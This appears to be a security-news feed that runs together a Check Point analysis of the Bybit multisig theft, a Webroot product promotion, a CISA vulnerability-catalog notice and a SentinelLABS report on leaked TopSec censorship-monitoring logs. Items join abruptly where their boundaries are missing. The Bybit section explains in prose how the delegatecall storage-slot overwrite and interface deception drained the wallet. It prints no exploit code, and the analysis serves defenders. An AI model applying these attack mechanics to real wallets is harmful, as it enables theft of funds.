&lt;li&gt;This past July, Check Point’s Threat Intelligence Blockchain system identified and published a concerning new findings where attackers manipulating legitimate transactions through the Safe Protocol’s execTransaction function.&lt;/li&gt;



&lt;li&gt;The recent hack highlights that multisig cold wallets are not secure if signers can be deceived, emphasizing the growing sophistication of supply chain and user interface manipulation attacks.&lt;/li&gt;



&lt;li&gt;The Bybit hack challenges previous beliefs about crypto security, showing that despite strong smart contracts and multisig protections, the human-interface layer remains vulnerable. This incident highlights how UI manipulation can compromise even the most secure wallets.&lt;/li&gt;
&lt;/ul&gt;



&lt;h2 class="wp-block-heading"&gt;&lt;strong&gt;The Evolution of Protocol Exploitation&lt;/strong&gt;&lt;/h2&gt;



&lt;p&gt;&lt;a href="https://research.checkpoint.com/2024/unveiling-the-scam-how-fraudsters-abuse-legitimate-blockchain-protocols-to-steal-your-cryptocurrency-wallet/"&gt;Published in July 2024&lt;/a&gt;, our research provided technical analysis of how the execTransaction function operates within the Safe framework and documented cases where it was used in attack chains.&lt;/p&gt;



&lt;p&gt;The research focused on understanding the technical mechanics of the Safe Protocol’s execTransaction function and its potential for misuse, highlighting the importance of understanding how legitimate protocol features could be leveraged unexpectedly.&lt;/p&gt;



&lt;p&gt;The recent Bybit incident represents a significant evolution of these attack patterns, introducing sophisticated UI manipulation techniques not previously seen. Instead of just exploiting protocol mechanics, the attackers compromised Safe&amp;#8217;s infrastructure to manipulate what signers saw when approving transactions, allowing them to compromise a significant institutional multisig setup.&lt;/p&gt;



&lt;h2 class="wp-block-heading"&gt;&lt;strong&gt;The Attack Breakdown&lt;/strong&gt;&lt;/h2&gt;



&lt;h3 class="wp-block-heading"&gt;&lt;strong&gt;Initial Compromise&lt;/strong&gt;&lt;/h3&gt;



&lt;p&gt;The attack originated from wallet address 0x47666fab8bd0ac7003bce3f5c3585383f09486e2, which executed an ExecTransaction on the Gnosis Safe multisig proxy contract.&lt;/p&gt;



&lt;figure class="wp-block-image size-full"&gt;&lt;img alt="" class="wp-image-31122" height="198" src="https://research.checkpoint.com/wp-content/uploads/2025/02/bybit-img-3.jpg" width="1000" /&gt;&lt;/figure&gt;



&lt;p&gt;This widely used multisig implementation relies on externally provided bytes signatures to authorize actions on behalf of the multisig.&lt;/p&gt;



&lt;p&gt;A critical vulnerability in this setup stems from Gnosis Safe’s reliance on externally generated signatures rather than on-chain voting. This design choice makes it susceptible to:&lt;/p&gt;



&lt;ul class="wp-block-list"&gt;
&lt;li&gt;UI manipulation&lt;/li&gt;



&lt;li&gt;Supply-chain attacks&lt;/li&gt;



&lt;li&gt;Manipulation of transaction data&lt;/li&gt;
&lt;/ul&gt;



&lt;figure class="wp-block-image size-full"&gt;&lt;img alt="" class="wp-image-31123" height="156" src="https://research.checkpoint.com/wp-content/uploads/2025/02/bybit-img-4.jpg" width="1000" /&gt;&lt;/figure&gt;



&lt;h3 class="wp-block-heading"&gt;&lt;strong&gt;Attack Execution Flow&lt;/strong&gt;&lt;/h3&gt;



&lt;ol class="wp-block-list"&gt;
&lt;li&gt;The attacker executed an ExecTransaction on the Gnosis Safe multisig proxy contract, manipulating what signers saw in the interface.&lt;/li&gt;



&lt;li&gt;The signers interacted with what appeared to be the legitimate Safe interface to approve what they believed was a legitimate transaction.&lt;/li&gt;



&lt;li&gt;The attack involved manipulation of the transaction data between what was displayed to signers and what was actually executed.&lt;/li&gt;



&lt;li&gt;The attacker then executed a delegate call to their contract at 0xbdd077f651ebe7f7b3ce16fe5f2b025be2969516, triggering the transfer function&lt;br /&gt;&lt;img alt="" class="wp-image-31124" height="369" src="https://research.checkpoint.com/wp-content/uploads/2025/02/bybit-img-5.jpg" style="width: 800px;" width="800" /&gt;&lt;/li&gt;



&lt;li&gt;Since the malicious contract was unverified, it needed to be decoded to understand the function of the transfer:&lt;br /&gt;&lt;img alt="" class="wp-image-31125" height="90" src="https://research.checkpoint.com/wp-content/uploads/2025/02/bybit-img-6.jpg" style="width: 800px;" width="800" /&gt;&lt;br /&gt;It contained code that overwrote the _transfer address in SLOT[0] of the contract, which executes the function in the original ByBit contract. Since the attacker’s contract declares _transfer as its first state variable, when called via delegatecall, this storage slot maps to the target contract’s SLOT[0]. This means that when the Safe multisig executes the delegatecall to this contract, the malicious contract’s code runs in the context of the Safe contract. By overwriting this slot, the attacker could alter the contract’s behaviour.&lt;/li&gt;



&lt;li&gt;This manipulation redirected further delegations to the attacker’s contract at 0xbDd077f651EBe7f7b3cE16fe5F2b025BE2969516&lt;/li&gt;



&lt;li&gt;The attacker&amp;#8217;s contract includes Sweep functions, which were executed via delegation to transfer funds.&lt;br /&gt;&lt;img alt="" class="wp-image-31126" height="435" src="https://research.checkpoint.com/wp-content/uploads/2025/02/bybit-img-7.jpg" style="width: 800px;" width="800" /&gt;&lt;/li&gt;



&lt;li&gt;This series of transactions resulted in the theft of over $1 billion in assets, including 400,000 ETH&lt;br /&gt;&lt;img alt="" class="wp-image-31127" height="220" src="https://research.checkpoint.com/wp-content/uploads/2025/02/bybit-img-8.jpg" style="width: 800px;" width="800" /&gt;&lt;/li&gt;
&lt;/ol&gt;



&lt;p&gt;This transaction is responsible for stealing over 1 billion dollars in lost:&lt;/p&gt;



&lt;p&gt;For example, 400,000 ETH:&lt;/p&gt;



&lt;figure class="wp-block-image size-full"&gt;&lt;img alt="" class="wp-image-31128" height="396" src="https://research.checkpoint.com/wp-content/uploads/2025/02/bybit-img-9.jpg" width="1000" /&gt;&lt;/figure&gt;



&lt;h2 class="wp-block-heading"&gt;&lt;strong&gt;Why This Attack is So Significant&lt;/strong&gt;&lt;/h2&gt;



&lt;p&gt;This hack sets a new precedent in crypto security by&amp;nbsp;&lt;strong&gt;bypassing a multisig cold wallet without exploiting any smart contract vulnerability&lt;/strong&gt;. Instead, it exploited&amp;nbsp;&lt;strong&gt;human trust and UI deception&lt;/strong&gt;:&lt;/p&gt;



&lt;ul class="wp-block-list"&gt;
&lt;li&gt;&lt;strong&gt;Multisigs are no longer a security guarantee&lt;/strong&gt; if signers can be compromised.&lt;/li&gt;



&lt;li&gt;&lt;strong&gt;Cold wallets aren’t automatically safe&lt;/strong&gt; if an attacker can manipulate what a signer sees.&lt;/li&gt;



&lt;li&gt;&lt;strong&gt;Supply chain and UI manipulation attacks are becoming more sophisticated&lt;/strong&gt;.&lt;/li&gt;
&lt;/ul&gt;



&lt;h2 class="wp-block-heading"&gt;&lt;strong&gt;Conclusion&lt;/strong&gt;&lt;/h2&gt;



&lt;p&gt;The Bybit hack has shattered long-held assumptions about crypto security. No matter how strong your smart contract logic or multisig protections are, the interface layer remains vulnerable. This attack proves that UI manipulation through infrastructure compromise can bypass even the most secure wallets. The industry needs to move to end-to-end prevention, where each transaction must be validated through multiple independent channels.&lt;/p&gt;

&lt;h2 class="wp-block-heading"&gt;The benefits of Webroot Total Protection and Essentials&lt;/h2&gt;



&lt;p&gt;The internet has become an integral part of everyday life. From online shopping and banking to remote work and social media, most of us spend a significant portion of our lives connected. While this connectivity brings convenience, it also comes with risks. Cybercrime is increasing at an alarming rate, targeting individuals and families just as often as businesses. Some of the most common threats include:&lt;/p&gt;



&lt;ul class="wp-block-list"&gt;
&lt;li&gt;&lt;strong&gt;Phishing &lt;/strong&gt;involves fraudulent emails or websites designed to trick you into revealing sensitive information.&lt;/li&gt;



&lt;li&gt;&lt;strong&gt;Identity theft &lt;/strong&gt;happens when criminals steal your personal information to commit fraud or theft.&lt;/li&gt;



&lt;li&gt;&lt;strong&gt;Ransomware &lt;/strong&gt;encrypts your files and demands payment to release them.&lt;/li&gt;



&lt;li&gt;&lt;strong&gt;Data breaches &lt;/strong&gt;occur when hackers gain unauthorized access to and steal sensitive files and information.&lt;/li&gt;



&lt;li&gt;&lt;strong&gt;Viruses and malware&lt;/strong&gt; programs harm your devices or steal your data.&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;The post &lt;a href="https://www.webroot.com/blog/2025/02/21/is-your-whole-digital-life-protected-4-ways-to-address-common-vulnerabilities/" rel="nofollow"&gt;Is your whole digital life protected? 4 ways to address common vulnerabilities&lt;/a&gt; appeared first on &lt;a href="https://www.webroot.com/blog" rel="nofollow"&gt;Webroot Blog&lt;/a&gt;.&lt;/p&gt;</description><content:encoded>&lt;p&gt;Cyber threats. Identity theft. Online profiling. Financial fraud. Social media misuse. The list just gets longer. As more aspects of our lives move online and digital devices proliferate, staying safe from threats has become more important than ever.&lt;/p&gt;



&lt;p&gt;Consider all the connected devices you use for daily tasks—browsing, shopping, banking, gaming, and more. Then think about all the content that you share on these devices every day; much of it likely contains sensitive or critical information that, in the wrong hands, could lead to serious damage with long-lasting impact.&lt;/p&gt;



&lt;p&gt;The solution? Comprehensive digital protection. Webroot Total Protection is the latest release in our Customer Digital Life Protection strategy that checks all the boxes. It’s a top-end, true all-in-one offering based on a new platform that combines antivirus, password manager, identity protection, VPN, backup, and parental controls.&lt;/p&gt;



&lt;h2 class="wp-block-heading"&gt;1. Protect your devices from viruses&lt;/h2&gt;



&lt;p&gt;How confident are you that your digital music, photos, and important documents—as well as email and applications—are safe? Cybercriminals are constantly developing new &lt;a href="https://www.webroot.com/us/en/resources/tips-articles/what-is-malware-protection"&gt;malware&lt;/a&gt;, &lt;a href="https://www.webroot.com/us/en/resources/glossary/what-is-ransomware"&gt;ransomware&lt;/a&gt;, and phishing attacks that can steal identities, encrypt memorable family photos and documents for ransom, and turn home computers into devices that criminals take over to send spam or steal data.&lt;/p&gt;



&lt;p&gt;Effective security software shields you from worms, trojans, &lt;a href="https://www.webroot.com/us/en/resources/glossary/what-is-adware"&gt;adware&lt;/a&gt;, and more. And it protects not just your PC and laptop, but also your tablets, smartphones, and other digital devices.&lt;/p&gt;



&lt;p&gt;Comprehensive antivirus software is most effective when used in conjunction with security best practices. Here are a few:&lt;/p&gt;



&lt;ul class="wp-block-list"&gt;
&lt;li&gt;Make sure your antivirus software performs scans regularly&lt;/li&gt;



&lt;li&gt;Install the latest security patches for your operating systems&lt;/li&gt;



&lt;li&gt;Keep your antivirus software up to date&lt;/li&gt;



&lt;li&gt;Be careful when downloading new apps onto devices; only download from app stores you trust&lt;/li&gt;



&lt;li&gt;Regularly backup important data&lt;/li&gt;
&lt;/ul&gt;



&lt;figure class="wp-block-image size-full"&gt;&lt;a href="https://blog-en.webroot.com/wp-content/uploads/2025/01/28122833/Webroot_blog_total-protection.jpg"&gt;&lt;img alt="Color illustration showing how Webroot antivirus protects devices." class="wp-image-33635" height="563" src="https://blog-en.webroot.com/wp-content/uploads/2025/01/28122833/Webroot_blog_total-protection.jpg" width="1000" /&gt;&lt;/a&gt;&lt;/figure&gt;



&lt;h2 class="wp-block-heading"&gt;&lt;br /&gt;2. Protect your privacy in your online activities&lt;/h2&gt;



&lt;p&gt;Sharing information has become commonplace in our digital lives. From purchasing a plane ticket to opening a bank account and registering to vote, or simply doing your grocery shopping online, getting through the day without sharing at least some &lt;a href="https://www.webroot.com/in/en/resources/glossary/what-is-personally-identifiable-information"&gt;personal information&lt;/a&gt; online seems nearly impossible.&lt;/p&gt;



&lt;p&gt;The flip side to this convenience, however, is that we risk losing control over who can access our personal information. Malicious actors are constantly seeking to collect personal data to commit fraud, steal identities, harass and threaten individuals, and more.&lt;/p&gt;



&lt;p&gt;Protecting privacy is a top priority for families facing growing threats. &lt;a href="https://www.webroot.com/blog/2017/09/01/password-manager/"&gt;&lt;strong&gt;Password managers&lt;/strong&gt;&lt;/a&gt;&lt;strong&gt; &lt;/strong&gt;generate strong, unique passwords and simplify their use, protecting you and saving time by automatically filling in credentials for website and app logins. Besides, using a &lt;strong&gt;&lt;a href="https://www.webroot.com/blog/2024/11/21/do-you-actually-need-a-vpn-your-guide-to-staying-safe-online/"&gt;VPN (Virtual Private Network)&lt;/a&gt;&lt;/strong&gt; that establishes secure connections to public Wi-Fi hotspots by encrypting data transmission will keep you safe and anonymous when you’re away from home.&lt;/p&gt;



&lt;p&gt;By paying attention to your device settings you can take steps to protect your privacy across your digital life:&lt;/p&gt;



&lt;ul class="wp-block-list"&gt;
&lt;li&gt;&lt;strong&gt;Social media: &lt;/strong&gt;Choose who can see your posts, photos, and personal information and review these settings regularly. Set your default sharing settings to &amp;#8220;friends&amp;#8221; or a more restricted group rather than &amp;#8220;public.&amp;#8221; Check which third-party apps have access to your account and remove those you no longer use.&lt;/li&gt;



&lt;li&gt;&lt;strong&gt;Mobile devices: &lt;/strong&gt;Disable location, camera, microphone, and contact list access for apps that don&amp;#8217;t truly need them. Consider turning off location services when not needed and review which apps track your location in the background.&lt;/li&gt;



&lt;li&gt;&lt;strong&gt;Web browsers: &lt;/strong&gt;Clear your browsing history and cookies regularly, block third-party cookies, and enable &amp;#8220;do not track&amp;#8221; features. Review and manage which sites can send you notifications, access your location, or use your camera/microphone.&lt;/li&gt;



&lt;li&gt;&lt;strong&gt;Smart home devices: &lt;/strong&gt;Review privacy settings for voice assistants like Alexa or Google Home regularly. Check what data these devices collect and adjust accordingly.&lt;/li&gt;



&lt;li&gt;&lt;strong&gt;Email services: &lt;/strong&gt;Keep tabs on apps and services that have access to your email account. Adjust spam filter settings to your preferences.&lt;/li&gt;



&lt;li&gt;&lt;strong&gt;Operating systems:&lt;/strong&gt; Check your privacy settings to control app permissions, data access, and tracking features.&lt;/li&gt;
&lt;/ul&gt;



&lt;h2 class="wp-block-heading"&gt;3. Safeguard your identity and private information&lt;/h2&gt;



&lt;p&gt;Once only seen in spy movies, identity theft today is very real, and poses serious financial, legal, and personal consequences. Bad actors can drain your bank accounts, open fraudulent credit cards, take out loans, file false tax returns, obtain medical services in your name, and more. The results range from damaged credit and mounting debt to inaccurate medical records and reputation damage.&lt;/p&gt;



&lt;p&gt;Some steps you can take to protect your identity include:&lt;/p&gt;



&lt;ul class="wp-block-list"&gt;
&lt;li&gt;&lt;strong&gt;Monitoring financial activity: &lt;/strong&gt;Check bank and credit card statements each month for unauthorized charges. Set up alerts for unusual transactions and review your credit reports.&lt;/li&gt;



&lt;li&gt;&lt;strong&gt;Securing personal information: &lt;/strong&gt;Only share Social Security numbers, birth dates, or account numbers when absolutely necessary. Shred or securely dispose of documents containing sensitive information and keep important documents in a secure location.&lt;/li&gt;



&lt;li&gt;&lt;strong&gt;Be wary of scams: &lt;/strong&gt;You shouldn’t respond to unsolicited phone calls, emails, or texts requesting personal information—legitimate organizations typically won&amp;#8217;t ask for sensitive details through these channels.&lt;/li&gt;



&lt;li&gt;&lt;strong&gt;Consider additional protection: &lt;/strong&gt;Identity theft protection services monitor your credit and personal information for suspicious activity and alert you to anomalies. Many will also reimburse up to $1 million for fraud expenses, stolen funds, and related costs such as lawyer and expert fees, lost wages, private investigator charges, and additional childcare or eldercare. They can also help you re-establish your identity—on average it takes 200 hours to restore an identity after fraud.&lt;/li&gt;
&lt;/ul&gt;



&lt;p&gt;How does an identity protection plan work?&lt;/p&gt;



&lt;p&gt;Usually such services include a secure online portal where you can register your personal data, like date of birth, driver’s license, SSN, account numbers, and more. Once you subscribe, make sure to take the time to create your profile and that of your family members, so you can start getting identity health reports and rapid alerts right away in case anything fraudulent is detected!&lt;/p&gt;



&lt;p&gt;If identity theft does happen, freeze any accounts with fraudulent charges and establish a fraud alert with credit bureaus. You can file an official identity theft report with the Federal Trade Commission at &lt;a href="https://www.identitytheft.gov/"&gt;IdentityTheft.gov.&lt;/a&gt; Contact relevant organizations, such as the Social Security Administration if your SSN was stolen. Close compromised accounts and open new ones with different account numbers, and new passwords and PINs.&lt;/p&gt;



&lt;p&gt;If you think the process of restoring your identity after theft is daunting, rest assure that cybersecurity or insurance companies offer identity protection plans that include the help of a remediation expert, who can guide you through the process. These professionals have in-depth knowledge of identity theft laws, credit reporting procedures, fraud resolution practices, and how to interact with various institutions to resolve issues effectively.&lt;/p&gt;



&lt;h2 class="wp-block-heading"&gt;Protect the data, document and precious memories stored on your devices&lt;/h2&gt;



&lt;p&gt;Theft isn’t the only threat to data – consider the impact that hardware failures, coffee spills, and accidental deletions can have on favorite photos, digital memories, and other unreplaceable items. This is where &lt;a href="https://www.webroot.com/us/en/resources/glossary/what-is-encryption"&gt;data encryption&lt;/a&gt; and automated backups come in.&lt;/p&gt;



&lt;p&gt;Data encryption protects data by translating it into a different, unreadable form using an encryption key. When it’s in that encrypted form, only someone with the unique decryption key or password can translate the data back into its readable state. Encryption is one of the most effective and widely used forms of data security available.&lt;/p&gt;



&lt;p&gt;With automated backup you can create a backup schedule that you can set and forget. Back-up files are typically uploaded to the cloud so they are accessible from anywhere. Changes that you make on your files are reflected in the backup ones.&lt;/p&gt;



&lt;p&gt;Data protection best practices include:&lt;/p&gt;



&lt;ul class="wp-block-list"&gt;
&lt;li&gt;Follow the 3-2-1 backup rule: three copies of data, on two different types of media, with one copy off-site&lt;/li&gt;



&lt;li&gt;Test restore procedures regularly&lt;/li&gt;



&lt;li&gt;Keep encryption keys and passwords secure but accessible&lt;/li&gt;



&lt;li&gt;Monitor backup logs and storage capacity&lt;/li&gt;



&lt;li&gt;Regularly update backup software for security patches&lt;/li&gt;
&lt;/ul&gt;



&lt;p class="has-text-align-center"&gt;&lt;strong&gt;You may already be protected in one or several of these areas,&lt;/strong&gt; &lt;br /&gt;&lt;strong&gt;but how could you make sure you truly have comprehensive protection?&lt;/strong&gt;&lt;/p&gt;



&lt;p&gt;&lt;strong&gt;Introducing Webroot Total Protection&lt;/strong&gt;&lt;/p&gt;

&lt;/ul&gt;
&lt;p&gt;These types of vulnerabilities are frequent attack vectors for malicious cyber actors and pose significant risks to the federal enterprise.&lt;/p&gt;
&lt;p&gt;&lt;a href="https://www.cisa.gov/binding-operational-directive-22-01" title="Binding Operational Directive (BOD) 22-01: Reducing the Significant Risk of Known Exploited Vulnerabilities"&gt;Binding Operational Directive (BOD) 22-01: Reducing the Significant Risk of Known Exploited Vulnerabilities&lt;/a&gt;&amp;nbsp;established the Known Exploited Vulnerabilities Catalog as a living list of known Common Vulnerabilities and Exposures (CVEs) that carry significant risk to the federal enterprise. BOD 22-01 requires Federal Civilian Executive Branch (FCEB) agencies to remediate identified vulnerabilities by the due date to protect FCEB networks against active threats. See the&lt;a&gt;&amp;nbsp;&lt;/a&gt;&lt;a href="https://www.cisa.gov/sites/default/files/publications/Reducing_the_Significant_Risk_of_Known_Exploited_Vulnerabilities_211103.pdf" title="BOD 22-01 Fact Sheet"&gt;BOD 22-01 Fact Sheet&lt;/a&gt;&amp;nbsp;for more information.&lt;/p&gt;
&lt;p&gt;Although BOD 22-01 only applies to FCEB agencies, CISA strongly urges all organizations to reduce their exposure to cyberattacks by prioritizing timely remediation of&amp;nbsp;&lt;a href="https://www.cisa.gov/known-exploited-vulnerabilities-catalog" title="Catalog vulnerabilities"&gt;Catalog vulnerabilities&lt;/a&gt;&amp;nbsp;as part of their vulnerability management practice. CISA will continue to add vulnerabilities to the catalog that meet the&amp;nbsp;&lt;a href="https://www.cisa.gov/known-exploited-vulnerabilities" title="specified criteria"&gt;specified criteria&lt;/a&gt;.&lt;/p&gt;</description><guid isPermaLink="false">/node/23040</guid></item><item><title>Censorship as a Service | Leak Reveals Public-Private Collaboration to Monitor Chinese Cyberspace</title><link>https://www.sentinelone.com/labs/censorship-as-a-service-leak-reveals-public-private-collaboration-to-monitor-chinese-cyberspace/</link><description>Data leak reveals how a top tier cybersecurity vendor helps the PRC enforce content monitoring and manipulation of public opinion in China.</description><content:encoded>&lt;h2&gt;Executive Summary&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;SentinelLABS has analyzed a data leak containing infrastructure details and work logs from employees of a state-affiliated private sector security firm in China.&lt;/li&gt;
&lt;li&gt;The leaked data contains references to web content monitoring services used to enforce censorship for public and private sector customers.&lt;/li&gt;
&lt;li&gt;Work logs reveal that the firm provided bespoke monitoring services to a state-owned enterprise when a corruption scandal impacted this organization, providing insights into how the state and CCP coordinate with some cybersecurity companies to manage fallout from corruption scandals.&lt;/li&gt;
&lt;/ul&gt;
&lt;h2&gt;Overview&lt;/h2&gt;
&lt;p&gt;SentinelLABS has analyzed a data leak from TopSec (北京天融), a Chinese cybersecurity firm offering services such as Endpoint Detection &amp;amp; Response (EDR) and vulnerability scanning, while offering boutique solutions to align with government initiatives and intelligence requirements.&lt;/p&gt;
&lt;p&gt;The data leak includes a document with 7,000+ lines of work logs and code used to orchestrate infrastructure for the firm’s DevOps practices and downstream customers and includes scripts that connect to several Chinese government hostnames, academic institutions and news sites.&lt;/p&gt;
&lt;p&gt;We identified work logs and system features that indicate TopSec is likely enabling content moderation for internet censorship purposes, a key &lt;a href="https://www.atlanticcouncil.org/in-depth-research-reports/report/community-watch-chinas-vision-for-the-future-of-the-internet/"&gt;strategy&lt;/a&gt; used by the Chinese Communist Party (CCP) to monitor and control public opinion on issues that the state deems contentious or antisocial.&lt;/p&gt;
&lt;p&gt;Further, we found evidence indicating that TopSec provided bespoke services to a state-owned enterprise on the date that a corruption investigation was announced targeting the organization’s top official.&lt;/p&gt;
&lt;p&gt;The Chinese cybersecurity market has long been a mystery for many researchers in the west. Unlike Europe and parts of the Middle East, which foster some degree of collaboration, the Chinese cybersecurity market is obscured behind the wall that divides China from the global internet. This finding reveals not only the types of technologies that are used by a prestigious Chinese tech firm, but how they are providing security services to private and public sector customers inside China.&lt;/p&gt;
&lt;h2&gt;TopSec&lt;/h2&gt;
&lt;p&gt;TopSec is a provider of monitoring and IT security solutions, as well as big data and cloud services. Established in 1995, TopSec prides itself on its long history and prioritizes national cyberspace security as a core element of its mission statement.&lt;/p&gt;
&lt;p&gt;Company registration details reveal that TopSec holds over 1,000 patents, 87 software copyrights, and has 12 subsidiaries. The company is also a &lt;a href="https://www.atlanticcouncil.org/in-depth-research-reports/report/sleight-of-hand-how-china-weaponizes-software-vulnerability/"&gt;Tier 1 vulnerability supplier&lt;/a&gt; to China’s civilian intelligence ministry. According to TopSec&amp;#8217;s 2024 annual corporate report for shareholders, the company has been offering cloud monitoring services–including IT security monitoring capabilities–since 2004. By 2020, these TopSec services were in use across all 31 of China’s administrative regions.&lt;/p&gt;
&lt;p&gt;&lt;img alt="Description of TopSec services" class="aligncenter size-full wp-image-114588" height="128" src="https://www.sentinelone.com/wp-content/uploads/2025/02/topsec_7.jpg" width="1999" /&gt;&lt;br /&gt;
&lt;figure class="wp-caption aligncenter" id="attachment_114604" style="width: 696px;"&gt;&lt;img alt="Description of TopSec services" class="size-full wp-image-114604" height="130" src="https://www.sentinelone.com/wp-content/uploads/2025/02/Screenshot-2025-02-20-at-14.27.08.jpg" width="696" /&gt;&lt;figcaption class="wp-caption-text" id="caption-attachment-114604"&gt;Description of TopSec services&lt;/figcaption&gt;&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;&lt;img alt="" class="aligncenter size-full wp-image-114591" height="683" src="https://www.sentinelone.com/wp-content/uploads/2025/02/topsec_4.jpg" width="1999" /&gt;&lt;br /&gt;
&lt;figure class="wp-caption aligncenter" id="attachment_114600" style="width: 782px;"&gt;&lt;img alt="TopSec&amp;#039;s 2024 annual corporate report" class="size-full wp-image-114600" height="266" src="https://www.sentinelone.com/wp-content/uploads/2025/02/topsec_12.jpg" width="782" /&gt;&lt;figcaption class="wp-caption-text" id="caption-attachment-114600"&gt;TopSec&amp;#8217;s 2024 annual corporate report (&lt;a href="https://file.finance.sina.com.cn/211.154.219.97:9494/MRGG/CNSESZ_STOCK/2024/2024-4/2024-04-20/10013439.PDF" target="_blank"&gt;Source&lt;/a&gt;)&lt;/figcaption&gt;&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;The leaked documents we analyzed reference multiple organizations in both the private and public sectors, likely customers or otherwise associated with TopSec, a selection of which is listed below. These references include probable deployment sites of monitoring probes and mentions in-work progress records.&lt;/p&gt;
&lt;p&gt;Public sector organizations referenced in the documents include entities integral to China’s political system, such as the Municipal Commissions for Discipline Inspection, which enforce party regulations and investigate corruption. Another example is the Illegal and Harmful Information Reporting Center, an entity dedicated to combating what the Chinese Communist Party (CCP) considers illegal and harmful behavior in the online space. TopSec customers referenced in these documents include:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Dongwu Fund Management Co., Ltd&lt;/li&gt;
&lt;li&gt;Gucheng County Petition Bureau&lt;/li&gt;
&lt;li&gt;Illegal and Harmful Information Reporting Center&lt;/li&gt;
&lt;li&gt;Linhai Rural Commercial Bank&lt;/li&gt;

&lt;/ul&gt;
&lt;p&gt;We observed references to three projects associated with Bureaus of the Ministry of Public Security in the northeastern city of Dandong, as well as the Songjiang and Pudong districts of Shanghai, with the latter project referred to as the &amp;#8220;Cloud Monitoring Service Project&amp;#8221;. The Ministry of Public Security is responsible for maintaining public order and overseeing law enforcement and surveillance activities to ensure compliance with national regulations.&lt;/p&gt;
&lt;pre&gt;
[2024-2025 Shanghai Public Security Bureau Pudong Branch Cloud Monitoring Service Project (Phase II)]
The statistics of events that occurred today are as follows:
Aggregated events: 883 Valid: 129 Invalid: 672 On-hand: 82
Single events: 5637 Valid: 187 Invalid: 2781 On-hand: 2669
In terms of event volume, it is basically the same as that of our competitors.
&lt;/pre&gt;
&lt;p&gt;A public procurement announcement for the &amp;#8220;Cloud Monitoring Service Project&amp;#8221; suggests that it involves monitoring the security posture and content of websites under the Bureaus&amp;#8217; jurisdiction, with alerts issued in case of security breaches or policy violations. TopSec was likely involved in the bidding process alongside competitor companies. Public documents, however, show TopSec did not win the contract.&lt;/p&gt;
&lt;figure class="wp-caption aligncenter" id="attachment_114586" style="width: 1999px;"&gt;&lt;img alt="Contract Announcement of Shanghai Public Security Bureau Pudong Branch Cloud Monitoring Service Project" class="size-full wp-image-114586" height="980" src="https://www.sentinelone.com/wp-content/uploads/2025/02/topsec_9.jpg" width="1999" /&gt;&lt;figcaption class="wp-caption-text" id="caption-attachment-114586"&gt;Contract announcement  for Cloud Monitoring Service Project (&lt;a href="https://www.zfcg.sh.gov.cn/luban/detail?parentId=137027&amp;amp;articleId=yuZoUGZxSiBaeduhBehxXA==" target="_blank"&gt;Source&lt;/a&gt;)&lt;/figcaption&gt;&lt;/figure&gt;
&lt;figure class="wp-caption aligncenter" id="attachment_114587" style="width: 1999px;"&gt;&lt;img alt="Procurement announcement for Cloud Monitoring Service Project" class="size-full wp-image-114587" height="1174" src="https://www.sentinelone.com/wp-content/uploads/2025/02/topsec_8.jpg" width="1999" /&gt;&lt;figcaption class="wp-caption-text" id="caption-attachment-114587"&gt;Procurement announcement for Cloud Monitoring Service Project (&lt;a href="https://www.shexgrp.com/jyzx/001001/001001004/001001004001/20240729/7979111.html" target="_blank"&gt;Source&lt;/a&gt;)&lt;/figcaption&gt;&lt;/figure&gt;
&lt;h2&gt;Infrastructure Features&lt;/h2&gt;
&lt;p&gt;We identified this leak as a submission to a multi-scanner platform that fired off a rule that looks for common abuse activities associated with Kubernetes. The main file we analyzed (SHA-1: &lt;code&gt;1bccef07ad0348e326248fe321259e2bd8f8cf8b&lt;/code&gt;) contains numerous work logs, which are a description of the work performed by a TopSec employee and the amount of time the task took, often accompanied by scripts, commands, or data related to the task.&lt;/p&gt;
&lt;figure class="wp-caption aligncenter" id="attachment_114590" style="width: 755px;"&gt;&lt;img alt="Example of work logs from the file along with English translation" class="size-full wp-image-114590" height="154" src="https://www.sentinelone.com/wp-content/uploads/2025/02/topsec_5.jpg" width="755" /&gt;&lt;figcaption class="wp-caption-text" id="caption-attachment-114590"&gt;Example of work logs from the file along with English translation&lt;/figcaption&gt;&lt;/figure&gt;
&lt;p&gt;In addition to work logs, the leak contains many commands and playbooks used to administrate TopSec’s services via multiple common DevOps and infrastructure technologies that are used worldwide, including Ansible, Docker, ElasticSearch, Gitlab, Kafka, Kibana, Kubernetes, and Redis. There are many artifacts showing JSON data for web APIs used by TopSec services. There are also network configurations, SSH and port mapping commands with hardcoded credentials, which present a huge security risk should anyone obtain access to the environment–and would likely provide access to TopSec’s downstream customers as well.&lt;/p&gt;
&lt;figure class="wp-caption aligncenter" id="attachment_114598" style="width: 686px;"&gt;&lt;img alt="Ansible commands from leaked file used to access infrastructure" class="size-full wp-image-114598" height="190" src="https://www.sentinelone.com/wp-content/uploads/2025/02/topsec_14.jpg" width="686" /&gt;&lt;figcaption class="wp-caption-text" id="caption-attachment-114598"&gt;Ansible commands from leaked file used to access infrastructure&lt;/figcaption&gt;&lt;/figure&gt;
&lt;p&gt;The leaked file is very large, disorganized, and the formatting is inconsistent, which complicates analysis. It is highly likely that we have not identified all capabilities outlined in the leak. Our analysis approach focused on translating the Chinese language content, identifying known technologies, and identifying interesting references in the commands and API JSON artifacts, particularly those where there were upticks in work logs performed around specific dates documented in the work logs or web API data.&lt;/p&gt;
&lt;p&gt;The data leak includes a file that starts with infrastructure management code, including some which initializes several Docker images to enable security monitoring related features. These containers run probes, which are likely used for network monitoring. We are unable to fully assess the capabilities of these containers without access to them. However, the containers are run with several flags such as &lt;code&gt;--privileged&lt;/code&gt; and &lt;code&gt;--net host&lt;/code&gt; that suggest deep access to the monitored data. This may indicate the probes inspect network traffic or perform privileged tasks in the deployment environment.&lt;/p&gt;
&lt;p&gt;Deeper in the file, there are work logs which contain dates indicating when certain tasks were performed and notes from the TopSec staff who worked on specific infrastructure projects. One project referenced repeatedly is called Sparta or Sparda, with the spelling changing regularly. Notes from the TopSec staff indicate that Sparta handles sensitive word processing, an indication of censorship keyword monitoring.&lt;/p&gt;
